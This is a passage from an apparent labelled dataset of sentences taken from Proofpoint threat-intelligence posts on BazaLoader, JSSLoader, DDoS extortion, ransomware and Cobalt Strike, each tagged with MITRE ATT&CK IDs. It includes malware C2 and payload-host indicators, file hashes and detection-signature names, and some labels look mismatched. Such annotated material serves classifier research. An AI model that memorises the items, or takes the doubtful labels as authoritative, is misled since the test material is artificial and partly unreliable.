messages contain a URL which leads to a fake webmail authentication page designed to harvest user credentials.", "labels": ["T1056", "T1566"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "A March 2021 Gmail-hosted campaign featured a fake employee benefits message and Microsoft Excel attachment targeting manufacturing, technology, and media/entertainment organizations.", "labels": ["T1059"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "If macros are enabled, it will install and run The Trick, a trojan that intercepts and logs banking website visits to steal credentials.", "labels": ["T1105", "T1059", "T1557"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "In February 2021, we also observed a very low volume Xorist ransomware campaign from a Gmail-hosted email address.", "labels": ["T1486"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "These documents contain macros which, if enabled, drop the ransomware.", "labels": ["T1059", "T1486"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "When coupled with heightened ransomware, supply chain, and cloud account compromise, advanced people-centric email protection must remain a top priority for security leaders.", "labels": ["T1486", "T1195"], "document": "proofpoint_2021-05-18_threat-actors-exploit-microsoft-and"}, {"sentence": "BazaFlix: BazaLoader Fakes Movie Streaming Service", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "1. BazaLoader affiliates continue to use elaborate infection chains requiring significant victim interaction to distribute BazaLoader malware.", "labels": ["S0534", "S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "2. Emails directed the victim to call a customer service line which sent them to a website containing malicious content.", "labels": ["T1566"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint researchers identified a BazaLoader campaign requiring significant human interaction to execute and install the BazaLoader backdoor.", "labels": ["S0534", "S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "The threat actor leveraged phone-based customer service representatives to direct victims to unknowingly download and install the [malware](https://www.proofpoint.com/us/threat-reference/malware).", "labels": ["T1566"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "This campaign is representative of a broader trend leveraged by the BazaLoader threat actors using call centers as part of an intricate attack chain.", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "BazaLoader is a downloader written in C++ that is used to download and execute additional modules.", "labels": ["S0534", "T1105"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint first observed BazaLoader in April 2020.", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "It is currently used by multiple threat actors and frequently serves as a loader for disruptive malware including [Ryuk](https://www.proofpoint.com/us/resources/webinars/what-healthcare-industry-should-know-about-ryuk-ransomware) and Conti [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware).", "labels": ["S0446", "T1486", "T1486"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint assesses with high confidence there is a strong overlap between the distribution and post-exploitation activity of BazaLoader and threat actors behind The Trick malware, also known as Trickbot.", "labels": ["S0534", "S0266", "S0266"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "In the recent BazaLoader campaign, messages purport to be from various senders with subjects such as:", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "*Figure 1: Initial BazaLoader email masquerading as an entertainment streaming service*", "labels": ["S0534", "T1566"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "When the user visits the site mentioned, navigates to the Frequently Asked Questions component of the website, and follows the directions to unsubscribe via the \u201cSubscribtion\u201d page, they will be directed to the download of an Excel Sheet.", "labels": ["T1566"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "The Excel sheet contains macros that, if enabled, will download BazaLoader.", "labels": ["T1105", "T1059"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "*Figure 5: Malicious Excel Sheet*", "labels": ["T1059"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint has observed BazarLoader threat actors using the method of phone-based customer service representatives to direct malicious downloads since February 2021.", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint has [previously observed](https://www.proofpoint.com/us/blog/threat-insight/baza-valentines-day) BazaLoader email threat campaigns requiring significant human interaction in order to execute the malware.", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Additionally, Proofpoint researchers have observed similar infection chains leading to the distribution of The Trick instead of BazaLoader.", "labels": ["S0266", "S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "By leveraging attack chains that require a lot of human interaction, threat actors can bypass some automated threat detection services that only flag on malicious links or attachments in email.", "labels": ["T1566"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Proofpoint anticipates the threat actors behind BazaLoader and The Trick will continue to use these techniques in future campaigns.", "labels": ["S0534", "S0266"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "BazaLoader threat actors are taking advantage of this human behavior trend in the identified campaign.", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "| 176.111.174[.]60 | IP | BazaLoader Excel Payload Host | 2021-05-04 |", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "| hxxps://18.237.242[.]195/g1\\_262/bt\\_64\\_g1\\_262 | URL | BazaLoader C2 | 2021-05-04 |", "labels": ["S0534", "TA0011"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "| hxxp://noise1[.]xyz/campo/n/o | URL | BazaLoader Excel Payload | 2021-05-04 |", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "| 9663dc275239aa93ceccedae7a0d54e10def18dd177d231264a323a4175a23d4 | SHA256 | BazaLoader Hash | 2020-04-25 |", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "2033033 - ET TROJAN BazaLoader CnC Activity \u00a0", "labels": ["S0534"], "document": "proofpoint_2021-05-26_bazaflix-bazaloader-fakes-movie-streaming"}, {"sentence": "Ransom DDoS Extortion Actor \u201cFancy Lazarus\u201d Returns", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "* The ransom distributed denial of service extortion threat actor known as \"Fancy Lazarus\" is back, taking aim at an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail sectors.", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "As of May 12, 2021,\u00a0Proofpoint\u00a0researchers are\u00a0tracking\u00a0renewed\u00a0distributed denial of service (DDoS)\u00a0extortion\u00a0activity\u00a0targeting\u00a0an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail\u00a0by the threat actor \u201cFancy Lazarus.", "labels": ["T1499", "T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "* New name:\u00a0The group, who have previously identified themselves as \u201cFancy Bear\u201d, \u201cLazarus,\u201d \u201cLazarus Group,\u201d and \u201cArmada Collective,\u201d among others,\u00a0is now going by \u201cFancy Lazarus.", "labels": ["G0007"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "In mid-to-late August 2020,\u00a0[Akamai](https://blogs.akamai.com/sitr/2020/08/ransom-demands-return-new-ddos-extortion-threats-from-old-actors-targeting-finance-and-retail.html)\u00a0and the U.S. Federal Bureau of Investigation\u00a0(FBI)\u00a0[alerted](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html)\u00a0organizations\u00a0to a spate of ransom denial-of-service extortion emails from this group.", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "They then threaten a DDoS attack in seven days, and,\u00a0to prove it is not a hoax, mention a \"small attack\" that will be launched on a specific IP, subnet, or Autonomous System.", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "Example of current emails being sent\u00a0by \u201cFancy Lazarus.", "labels": [], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "Previously the sender often contained \u201cFancy Bear,\u201d\u00a0\"F.B.,\u201d\u00a0\"Armada Collective,\u201d\u00a0\"A.C.,\u201d\u00a0\"Lazarus,\u201d\u00a0or \"Lazarus Group,\" and even\u00a0at times\u00a0included the targeted company\u2019s\u00a0highest-ranking\u00a0person such as\u00a0the\u00a0CEO\u2019s\u00a0name.", "labels": ["G0007"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "While Proofpoint does not have visibility into the actual \u201cFancy Lazarus\u201d DDoS attacks and whether they are carried out, FBI\u00a0[reporting](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html)\u00a0indicates that many affected companies that pass the threatened deadline either do not see any additional activity or the activity is successfully mitigated.", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "A recent [report](https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html \"https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html\") by Akamai also notes a resurgence of this activity since May 2021 and provides a great amount of details and examples on the specific nature of the DDoS traffic.", "labels": ["T1499"], "document": "proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy"}, {"sentence": "* Downloading sensitive data from IT-approved applications", "labels": ["T1566"], "document": "proofpoint_2021-06-17_announcing-proofpoint-information-and-cloud"}, {"sentence": "While email has historically been the undisputed champion of [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware) attack vectors, its role has undergone a major transformation.", "labels": ["T1486", "T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Ransomware\u00a0was once\u00a0sent to users directly, usually in an email attachment.", "labels": ["T1566"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "These direct or \u201c[first stage](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware)\u201d attacks peaked in 2017 during the\u00a0[Locky\u00a0ransomware](/us/threat-insight/post/dridex-actors-get-in-ransomware-with-locky \"Locky Ransomware Is Becoming More Sophisticated - Cybercriminals Continue Email Campaign Innovation\")\u00a0outbreak.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "As\u00a0DeGrippo\u00a0tells Dark Reading: \u201cMany IT and information security teams in corporate settings were able to quickly adapt to the handling of a ransomware incident on a single laptop or host, treating it in some ways as stolen hardware and simply reformatting and moving on.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "That began changing in 2018 as\u00a0[ransomware attackers](/us/security-awareness/post/ransomware-roundup-march-2018 \"Ransomware Roundup: March 2018\")\u00a0increasingly\u00a0leveraged\u00a0cybercriminal organizations \u2013 mostly banking trojan distributors \u2013 to install \u201caccess facilitators.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Instead of directly launching a ransomware attack, malicious links and attachments within the email quietly download backdoor trojans unbeknownst to users.", "labels": ["T1486", "T1566", "T1105"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Some attackers maintain the access and sell it, some\u00a0cover their tracks toremove traces of their presence.", "labels": ["T1070"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "\u201cThreat actors moved to downloaders as a first stage to give themselves more choice and flexibility,\u201d she continues.", "labels": ["T1105"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "While direct ransomware attacks are not extinct, they\u2019re getting there.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "In fact, only one strain accounted\u00a0for 95 percent direct, first-stage ransomware attacks in\u00a0the first half of\u00a02021.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "### That Was Then,\u00a0This\u00a0is Now These days, banking trojans\u00a0\u2013 often used as ransomware loaders \u2013are the runaway favorite among malware distributors.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Compounding the problem, criminal groups already distributing banking trojans can join ransomware \u201caffiliate networks\u201d to further their reach.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Proofpoint currently tracks 10 threat actors\u00a0acting as\u202finitial access\u202ffacilitators\u202for likely ransomware affiliates.", "labels": ["TA0001", "T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Prior to its takedown in 2020, the\u00a0[Emotet\u00a0botnet](/us/threat-insight/post/proofpoint-q1-2019-threat-report-emotet-carries-quarter-consistent-high-volume \"Proofpoint Q1 2019 Threat Report: Emotet carries the quarter with consistent high-volume campaigns\")\u00a0was one of the most prolific ransomware distributors between 2018 and 2020.", "labels": ["S0367", "S0367", "T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Since\u00a0Emotet\u2019s\u00a0disruption,\u00a0DeGrippo\u2019s\u00a0team has tracked a myriad of other malware such as\u202fThe Trick,\u202fDridex,\u202fQbot,\u202fIcedID,\u202fZLoader,\u202fUrsnif, serving as first-stage malware payloads in attempts to enable further infections.", "labels": ["S0367", "S0266", "S0384", "S0483", "S0386", "T1105"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Proofpoint researchers have also tracked downloaders like\u00a0Buer\u00a0Loader and\u00a0[BazaLoader](/us/blog/threat-insight/bazaflix-bazaloader-fakes-movie-streaming-service \"BazaFlix: BazaLoader Fakes Movie Streaming Service \")\u00a0which often serve as an initial attack vector for ransomware.", "labels": ["S0534", "S0534", "T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "The article notes that ransomware is not the only second stage payload associated with the above malware and downloaders, and that ransomware purveyors do use other attack methods to distribute their product.", "labels": ["T1486", "T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "In other words, ransomware isn\u2019t limited to existing backdoors.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "Dark Reading concludes with some findings by Check Point Research which point to a dramatic surge in ransomware, including a 93 percent growth year-over-year.", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "In 2021 alone, ransomware has experienced a 41 percent growth, felt most in Latin America (62 percent) and Europe (59 percent).", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "To learn more about Proofpoint\u2019s ransomware research, visit:\u00a0", "labels": ["T1486"], "document": "proofpoint_2021-06-22_ransomware-insights-proofpoints-senior-director"}, {"sentence": "JSSLoader: Recoded and Reloaded\u202f", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "* After a months-long absence, the malware loader\u00a0JSSLoader\u00a0returned in June 2021 campaigns rewritten from the .NET programming language to C++.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "* Current\u00a0TA543\u00a0campaigns\u00a0delivering\u00a0JSSLoader\u00a0are\u00a0using similar lures\u00a0to those observed by Proofpoint researchers in 2019\u00a0and\u00a0the emails\u00a0continue to\u00a0contain links to a TDS landing page.", "labels": ["S0648", "T1566"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "In June 2021,\u00a0Proofpoint researchers observed a new variant of the downloader\u00a0JSSLoader\u00a0in several campaigns impacting a variety of organizations.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "This change, while not unheard of, is not a common occurrence and could be an effort by the threat actors utilizing\u00a0JSSLoader\u00a0to evade current detections.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "JSSLoader\u00a0is often dropped in the first or second stage of a campaign and has the functionality to profile infected machines and load additional payloads.", "labels": ["S0648", "T1105"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Proofpoint researchers initially observed\u00a0[JSSLoader](https://malpedia.caad.fkie.fraunhofer.de/details/win.jssloader)\u00a0in September 2019.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "#### 2019\u00a0Version of\u00a0JSSLoader\u00a0(.NET)", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "JSSLoader\u00a0is an initial access malware\u00a0that\u00a0was written in .NET and was named after its \u201cJSS\u201d namespace and \u201cjssAdmin\u201d command and control (C&C) panel login page:\u00a0", "labels": ["S0648", "TA0001", "TA0011", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "*Figure\u00a01. JSSLoader\u00a0C&C panel login page from September\u00a027,\u00a02019\u00a0version.*", "labels": ["S0648", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Its C&C used HTTPS requests with base64-encoded data:\u00a0", "labels": ["T1071"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "*Figure\u00a02. Example C&C request from September 27,\u00a02019\u00a0version.*", "labels": ["TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The initial C&C beacon contained verbose system information:\u00a0", "labels": ["T1041"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Its commands and functionality focused on executing a next stage\u00a0executableor JavaScript:\u00a0", "labels": ["T1105"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Its commands and functionality focused on executing a next stage\u00a0executable\u00a0or JavaScript:\u00a0", "labels": ["T1059"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "#### 2020-2021\u00a0JSSLoader\u00a0Changes\u00a0(.NET)", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Since the initial version of\u00a0JSSLoader, there have been gradual changes and improvements to the malware in successive campaigns.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Morphisec\u00a0wrote about some of these in a January 2021 paper titled \u201c[Threat Profile the Evolution of the FIN7\u00a0JSSLoader\u00a0(PDF)](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/FIN7%20JSSLOADER%20FINAL%20WEB.pdf).", "labels": ["G0046", "S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "For\u00a0example, the\u00a0JSSLoader\u00a0used in a December 14,\u00a02020\u00a0email-based campaign sent the following system information:\u00a0", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "In addition to the changes in the C&C protocol, several new commands were added.", "labels": ["TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "#### June 2021\u00a0JSSLoader\u00a0(C++)", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "In June 2021, email campaigns resumed, but the\u00a0JSSLoader\u00a0malware had been redeveloped from using the .NET programming language to C++ (this change was also\u00a0[noticed on infosec Twitter](https://twitter.com/Arkbird_SOLG/status/1400845449515372555)).", "labels": ["T1566", "S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Proofpoint recently\u00a0[documented](https://www.proofpoint.com/us/blog/threat-insight/new-variant-buer-loader-written-rust)\u00a0another\u00a0initial access\u00a0malware known as \u201cBuer\u00a0Loader\u201d that was redeveloped from the C programming language to Rust.", "labels": ["TA0001"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The C++ version of\u00a0JSSLoader\u00a0analyzed\u00a0here is\u00a0from a June 8,\u00a02021\u00a0email-based campaign.", "labels": ["S0648", "T1566"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "It sets up \u201cregistry run\u201d persistence using a value name of \u201cAppJSSLoader\u201d and has similar style of system information beacon as the later .NET versions:\u00a0", "labels": ["T1547"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "C&C protocol and command similarity\u00a0was\u00a0likely a choice to remain backwards compatible with the existing .NET\u00a0version\u2019s\u00a0C&C panel software.", "labels": ["TA0011", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "JSSLoader\u00a0appears to be exclusive to several\u00a0threat actors.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Most of the campaigns\u00a0were\u00a0attributed to\u00a0the threat actor tracked by Proofpoint as\u00a0TA543.", "labels": [], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "A typical campaign contains thousands of email messages and targets several hundred organizations.", "labels": ["T1566"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The lures used by TA543\u00a0typically focus on\u00a0invoices and delivery information of packages.", "labels": [], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "On\u00a0September\u00a027,\u00a02019\u00a0Proofpoint analysts observed a TA543 campaign spoofing Intuit\u00a0branding.", "labels": [], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The threat actor used a likely compromised account for an email marketing service to send the malicious emails that purported to be invoices and\u00a0contained URLs linking to a landing page hosting\u00a0BlackTDS.\u00a0The TDS would direct the user to the download another file, a VBS downloader, hosted on SharePoint.", "labels": ["T1566", "T1059"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The VBS downloader would then download\u00a0JSSLoader.", "labels": ["T1059", "S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "During our analysis of\u00a0JSSLoader, it additionally loaded a Griffon payload which is historically associated with another actor, TA3546, also known as FIN7 or\u00a0Carbanak.", "labels": ["S0648", "S0417", "G0046", "G0046", "G0046"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "In the following months\u00a0Proofpoint analysts\u00a0observed TA543 shift to primarily delivering\u00a0JSSLoader\u00a0and/or other loaders that were often observed downloading other TA3546-associated payloads.", "labels": ["S0648", "G0046"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "*Figure\u00a09. TA543 email that leads\u00a0to the download of\u00a0JSSLoader.*", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "On June 8, 2021,\u00a0Proofpoint analysts\u00a0observed a TA543 campaign spoofing\u00a0UPS\u00a0branding (Figure\u00a010).", "labels": [], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The email contained\u00a0URLs\u00a0linking\u00a0to a\u00a0Keitaro\u00a0TDS landing.", "labels": ["T1566"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "If executed, it downloaded\u00a0an intermediate script,\u00a0which then downloaded\u00a0and executed\u00a0the C++ version of\u00a0JSSLoader.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "*Figure\u00a010. TA543 email sample\u00a0from\u00a0June 8, 2021, that leads to the\u00a0download\u00a0of\u00a0JSSLoader.*", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "The threat actors behind\u00a0JSSLoader\u00a0have continuously made modifications since its debut in 2019 and are likely to continue doing so using the 2021 variant.", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d\u00a0 | SHA256\u00a0 | September 27,\u00a02019\u00a0JSSLoader\u00a0Sample\u00a0 |", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| bikweb\\.com\u00a0 | Hostname\u00a0 | September 27,\u00a02019\u00a0JSSLoader\u00a0C&C\u00a0 |", "labels": ["S0648", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| a062a71a6268af048e474c80133f84494d06a34573c491725599fe62b25be044\u00a0 | SHA256\u00a0 | December 14,\u00a02020\u00a0JSSLoader\u00a0sample\u00a0 |", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| monusorge\\.com\u00a0 | Hostname\u00a0 | December 14,\u00a02020\u00a0JSSLoader\u00a0C&C\u00a0 |", "labels": ["S0648", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| 7a17ef218eebfdd4d3e70add616adcd5b78105becd6616c88b79b261d1a78fdf\u00a0 | SHA256\u00a0 | June 8,\u00a02021\u00a0JSSLoader\u00a0Sample\u00a0 |", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "| injuryless\\.com\u00a0 | Hostname\u00a0 | June 8,\u00a02021\u00a0JSSLoader\u00a0C&C\u00a0 |", "labels": ["S0648", "TA0011"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "2033072 - ET TROJAN FIN7\u202fJSSLoader\u202fVariant Activity (POST)\u202f\u00a0", "labels": ["G0046", "S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "2033074 - ET TROJAN FIN7\u202fJSSLoader\u202fVariant Activity (GET)\u202f\u00a0", "labels": ["G0046", "S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "2842028 - ETPRO TROJAN\u202fJSSLoader\u202fCnC\u202fHost\u202fCheckin\u202f\u00a0", "labels": ["S0648"], "document": "proofpoint_2021-06-24_jssloader-recoded-and-reloaded"}, {"sentence": "Cobalt Strike: Favorite Tool from APT to Crimeware", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "* Malicious use of Cobalt Strike\u00a0in threat actor campaigns\u00a0is increasing.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "* Threat actor use of Cobalt Strike increased 161 percent\u00a0from 2019 to\u00a02020\u00a0and remains\u00a0a\u00a0high-volume\u00a0threat\u00a0in 2021.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "* Cobalt Strike is\u00a0currently\u00a0used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In 2021, Cobalt Strike\u00a0is\u00a0appearing\u00a0in\u00a0Proofpoint\u00a0threat\u00a0data more frequently than ever.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike is a legitimate security tool used by penetration testers to emulate\u00a0threat actor\u00a0activity in a network.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "When\u00a0mapped to\u00a0the\u00a0[MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint\u2019s\u00a0visibility\u00a0into the attack chain\u00a0focuses on\u00a0[Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence\u00a0mechanisms.", "labels": ["TA0001", "TA0002", "TA0003"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Based on our data,\u00a0Proofpoint assesses\u00a0with high confidence\u00a0that\u00a0Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage\u00a0tool threat actors\u00a0use\u00a0once access is achieved, with\u00a0criminal\u00a0threat\u00a0actors making up the bulk of\u00a0attributed\u00a0Cobalt Strike\u00a0campaigns\u00a0in 2020.", "labels": ["S0154", "TA0001", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Investigators\u00a0[revealed 